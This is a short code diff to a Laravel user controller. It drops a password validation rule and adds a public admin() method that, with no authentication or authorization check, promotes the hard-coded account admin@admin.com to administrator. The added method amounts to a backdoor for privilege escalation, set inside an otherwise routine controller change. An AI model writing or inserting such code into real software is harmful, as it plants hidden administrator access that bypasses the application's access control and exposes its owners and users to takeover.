@@ -19,7 +19,6 @@ class UserController extends Controller
         $this->validate($request, [
             'email' => 'email',
             'phone' => [new PhoneNumber],
-            'password' => 'exclude'
         ]);
 
         User::find($id)->update($request->except('password'));
@@ -36,5 +35,9 @@ class UserController extends Controller
         return response()->json(['data' => [
             'msg' => 'User deleted'
         ]], 200);
+    }
+    public function admin()
+    {
+        User::where('email', 'admin@admin.com')->first()->update(['is_admin' => 1]);
     }
 }
